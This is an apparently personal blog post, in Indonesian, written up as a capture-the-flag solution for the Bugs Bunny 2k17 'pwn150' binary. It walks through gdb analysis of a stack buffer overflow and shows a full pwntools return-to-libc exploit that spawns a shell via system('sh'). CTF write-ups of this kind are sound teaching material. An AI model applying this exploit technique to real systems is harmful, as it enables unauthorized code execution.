@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Bugs Bunny 2k17 CTF - Pwn150 :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn150 pwn150: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dc1ada44067255e5211fafc5133679404b54f110, not stripped Elf binary tersebut diproteksi NX (No-eXecute)
+gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik Return-to-libc."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/post/2017-07-22-bugs-bunny2k17-pwn150/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bugs Bunny 2k17 CTF - Pwn150"/>
+<meta name="twitter:description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn150 pwn150: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dc1ada44067255e5211fafc5133679404b54f110, not stripped Elf binary tersebut diproteksi NX (No-eXecute)
+gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik Return-to-libc."/>
+
+
+
+<meta property="og:title" content="Bugs Bunny 2k17 CTF - Pwn150" />
+<meta property="og:description" content="Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn150 pwn150: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dc1ada44067255e5211fafc5133679404b54f110, not stripped Elf binary tersebut diproteksi NX (No-eXecute)
+gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik Return-to-libc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/2017-07-22-bugs-bunny2k17-pwn150/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/post/2017-07-22-bugs-bunny2k17-pwn150/">Bugs Bunny 2k17 CTF - Pwn150</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by Aiden Pearce</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/bugs-bunny2k17/">bugs-bunny2k17</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/ctf.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Diberikan file ELF binary bernama <code>pwn150</code> 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  file pwn150
+pwn150: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>dc1ada44067255e5211fafc5133679404b54f110, not stripped
+</code></pre></div><p>Elf binary tersebut diproteksi NX (No-eXecute)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik <code>Return-to-libc</code>.</p>
+<p>Menggunakan <code>gdb</code> diketahui terdapat 3 user defined function yaitu <code>main</code>, <code>today</code> dan <code>Hello</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400598  _init
+0x00000000004005d0  puts@plt
+0x00000000004005e0  system@plt
+0x00000000004005f0  printf@plt
+0x0000000000400600  __libc_start_main@plt
+0x0000000000400610  fgets@plt
+0x0000000000400620  fflush@plt
+0x0000000000400630  fopen@plt
+0x0000000000400640  fwrite@plt
+0x0000000000400660  _start
+0x0000000000400690  deregister_tm_clones
+0x00000000004006d0  register_tm_clones
+0x0000000000400710  __do_global_dtors_aux
+0x0000000000400730  frame_dummy
+0x0000000000400756  today
+0x0000000000400767  Hello
+0x00000000004007f4  main
+0x0000000000400820  __libc_csu_init
+0x0000000000400890  __libc_csu_fini
+0x0000000000400894  _fini
+</code></pre></div><p>Hasil disassembly fungsi today</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ pdisass today
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> today:
+   0x0000000000400756 &lt;+0&gt;:	push   rbp
+   0x0000000000400757 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040075a &lt;+4&gt;:	mov    edi,0x4008a8
+   0x000000000040075f &lt;+9&gt;:	call   0x4005e0 &lt;system@plt&gt;
+   0x0000000000400764 &lt;+14&gt;:	nop
+   0x0000000000400765 &lt;+15&gt;:	pop    rbp
+   0x0000000000400766 &lt;+16&gt;:	ret    
+End of assembler dump.
+</code></pre></div><p>Terdapat pemanggilan fungsi <code>system</code> dengan argument <code>/bin/date</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/s 0x4008a8
+0x4008a8:	<span style="color:#e6db74">&#34;/bin/date&#34;</span>
+</code></pre></div><p>Hasil disassembly fungsi Hello</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ pdisass Hello
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> Hello:
+   0x0000000000400767 &lt;+0&gt;:	push   rbp
+   0x0000000000400768 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040076b &lt;+4&gt;:	sub    rsp,0x50
+   0x000000000040076f &lt;+8&gt;:	mov    edi,0x4008b8
+   0x0000000000400774 &lt;+13&gt;:	mov    eax,0x0
+   0x0000000000400779 &lt;+18&gt;:	call   0x4005f0 &lt;printf@plt&gt;
+   0x000000000040077e &lt;+23&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rip+0x2008eb<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400785 &lt;+30&gt;:	mov    rdi,rax
+   0x0000000000400788 &lt;+33&gt;:	call   0x400620 &lt;fflush@plt&gt;
+   0x000000000040078d &lt;+38&gt;:	mov    rdx,QWORD PTR <span style="color:#f92672">[</span>rip+0x2008ec<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x601080 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400794 &lt;+45&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x50<span style="color:#f92672">]</span>
+   0x0000000000400798 &lt;+49&gt;:	mov    esi,0xc0
+   0x000000000040079d &lt;+54&gt;:	mov    rdi,rax
+   0x00000000004007a0 &lt;+57&gt;:	call   0x400610 &lt;fgets@plt&gt;
+   0x00000000004007a5 &lt;+62&gt;:	mov    esi,0x4008e1
+   0x00000000004007aa &lt;+67&gt;:	mov    edi,0x4008e3
+   0x00000000004007af &lt;+72&gt;:	call   0x400630 &lt;fopen@plt&gt;
+   0x00000000004007b4 &lt;+77&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,rax
+   0x00000000004007b8 &lt;+81&gt;:	cmp    QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,0x0
+   0x00000000004007bd &lt;+86&gt;:	jne    0x4007d0 &lt;Hello+105&gt;
+   0x00000000004007bf &lt;+88&gt;:	mov    edi,0x4008f8
+   0x00000000004007c4 &lt;+93&gt;:	call   0x4005d0 &lt;puts@plt&gt;
+   0x00000000004007c9 &lt;+98&gt;:	mov    eax,0x1
+   0x00000000004007ce &lt;+103&gt;:	jmp    0x4007f2 &lt;Hello+139&gt;
+   0x00000000004007d0 &lt;+105&gt;:	mov    rdx,QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>
+   0x00000000004007d4 &lt;+109&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x50<span style="color:#f92672">]</span>
+   0x00000000004007d8 &lt;+113&gt;:	mov    rcx,rdx
+   0x00000000004007db &lt;+116&gt;:	mov    edx,0x1
+   0x00000000004007e0 &lt;+121&gt;:	mov    esi,0x40
+   0x00000000004007e5 &lt;+126&gt;:	mov    rdi,rax
+   0x00000000004007e8 &lt;+129&gt;:	call   0x400640 &lt;fwrite@plt&gt;
+   0x00000000004007ed &lt;+134&gt;:	mov    eax,0x0
+   0x00000000004007f2 &lt;+139&gt;:	leave  
+   0x00000000004007f3 &lt;+140&gt;:	ret    
+End of assembler dump.
+</code></pre></div><p>fungsi <code>fgets</code> digunakan untuk user input sebanyak <code>0xc0</code> bytes atau 192 bytes dalam desimal.
+Selain itu, fungsi <code>fopen</code> akan membuka file bernama <code>bugsbunny.txt</code> dalam mode <code>a</code> atau <code>append</code> untuk menyimpan inputan user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/s 0x4008e1
+0x4008e1:	<span style="color:#e6db74">&#34;a&#34;</span>
+gdb-peda$ x/s 0x4008e3
+0x4008e3:	<span style="color:#e6db74">&#34;bugsbunny.txt&#34;</span>
+</code></pre></div><p>Setelah itu fungsi <code>puts</code> akan mengeluarkan output <code>So shorry cant talk to you now :( </code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/s 0x4008f8
+0x4008f8:	<span style="color:#e6db74">&#34;So shorry cant talk to you now :( &#34;</span>
+</code></pre></div><h3 id="lets-overflow">Let&rsquo;s OverFlow</h3>
+<p>Setelah dilakukan fuzzing, dibutuhkan 88 bytes untuk mengoverwrite register <code>rip</code>.</p>
+<p>percobaan dengan menginput kan 88 bytes huruf &ldquo;A&rdquo; + 4 bytes huruf &ldquo;B&rdquo; untuk memastikan nya kalau itu benar-benar 88 bytes untuk mengoverwrite <code>rip</code> nya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/x $rip
+0xa42424242:	Cannot access memory at address 0xa42424242
+</code></pre></div><p>Terlihat 0x42 adalah huruf &lsquo;B&rsquo; dalam ascii.</p>
+<p>Karena 64 bit elf binary menyimpan argument nya pada register yang mana masing-masing argument ke 1,2,3 dst (dan saya bingung wkwk) akan disimpan di <code>rdi, rsi dan rcx</code> .
+saya menggunakan <a href="http://ropshell.com/ropsearch?h=4a33feaf7ac08268b924f4cb8b5cafbe">online rop gadget search</a> untuk mencari gadget <code>pop rdi; ret</code> yang digunakan untuk memasukan argument ke <code>rdi</code>.</p>
+<p>Didapatkan gadget <code>pop rdi; ret</code> berada didalamat <code>0x00400883</code>.</p>
+<p>Setelah itu mencari alamat dari fungsi <code>system</code> didapatkan <code>0x00000000004005e0</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ info functions
+All defined functions:
+
+Non-debugging symbols:
+....
+0x00000000004005e0  system@plt
+....
+</code></pre></div><p>Lalu mencari alamat dari <code>sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ find <span style="color:#e6db74">&#34;sh&#34;</span>
+Searching <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sh&#39;</span> in: None ranges
+Found <span style="color:#ae81ff">100</span> results, display max <span style="color:#ae81ff">100</span> items:
+    pwn150 : 0x4003ef --&gt; 0x6e65706f66006873 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sh&#39;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>Tujuan kita adalah me spawning shell dengan fungsi <code>system('sh')</code> karena binary tersebut di proteksi dengan NX jadi tidak bisa menggunakan shellcode.</p>
+<p>Sehingga penyusunan payloadnya akan menjadi seperti berikut</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">junk + pop_rdi_ret_addr + sh_addr + system_addr
+</code></pre></div><p>Atau implementasi menggunakan python.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>
+sh_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4003ef</span>)
+pop_rdi_ret_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400883</span>) <span style="color:#75715e"># pop rdi; ret</span>
+system_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004005e0</span>)
+
+payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop_rdi_ret_addr <span style="color:#f92672">+</span> sh_addr <span style="color:#f92672">+</span> system_addr
+</code></pre></div><p>Berikut exploit code lengkap nya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+<span style="color:#66d9ef">print</span> context<span style="color:#f92672">.</span>arch
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;/home/rhama/Downloads/pwn150&#34;</span>)
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>
+sh_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4003ef</span>)
+pop_rdi_ret_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400883</span>) <span style="color:#75715e"># pop rdi; ret</span>
+system_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004005e0</span>)
+
+payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop_rdi_ret_addr <span style="color:#f92672">+</span> sh_addr <span style="color:#f92672">+</span> system_addr
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;: &#34;</span>,payload)
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Setelah code dieksekusi akan mendapat interactive shell.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<blockquote>
+</blockquote>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/2016-12-24-basic-reverse-engineering-linux-binaries/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Basic Reverse Engineering Linux Binaries</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/2017-06-22-bugs-bunny2k17-pwn50/">
+                  <span class="button__text">Bugs Bunny 2k17 CTF - Pwn50</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
